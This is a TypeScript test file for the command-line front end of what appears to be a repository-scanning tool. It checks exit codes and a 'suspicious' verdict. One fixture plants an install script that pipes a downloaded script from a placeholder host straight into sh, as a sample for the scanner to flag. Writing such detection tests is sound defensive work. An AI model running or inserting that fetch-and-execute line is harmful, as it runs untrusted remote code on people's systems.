import { afterEach, describe, expect, it, vi } from "vitest";

import { main } from "../src/cli";
import { FakeGitHub, makeTarball } from "./helpers";

describe("cli", () => {
  afterEach(() => vi.unstubAllGlobals());

  it("exits 3 on usage errors and invalid targets", async () => {
    const err = vi.spyOn(console, "error").mockImplementation(() => undefined);
    expect(await main([])).toBe(3);
    expect(await main(["--help"])).toBe(3);
    expect(await main(["not/a/repo/x"])).toBe(3);
    err.mockRestore();
  });

  it("maps verdicts to exit codes", async () => {
    const log = vi.spyOn(console, "log").mockImplementation(() => undefined);
    const gh = new FakeGitHub();
    vi.stubGlobal("fetch", gh.fetch);
    expect(await main(["octo/demo"])).toBe(0);
    gh.tarball = makeTarball({ "install.sh": "curl -s https://example.invalid/x.sh | sh\n" });
    expect(await main(["octo/demo", "--json"])).toBe(1);
    const json = JSON.parse(String(log.mock.calls.at(-1)?.[0]));
    expect(json.verdict).toBe("suspicious");
    log.mockRestore();
  });
});
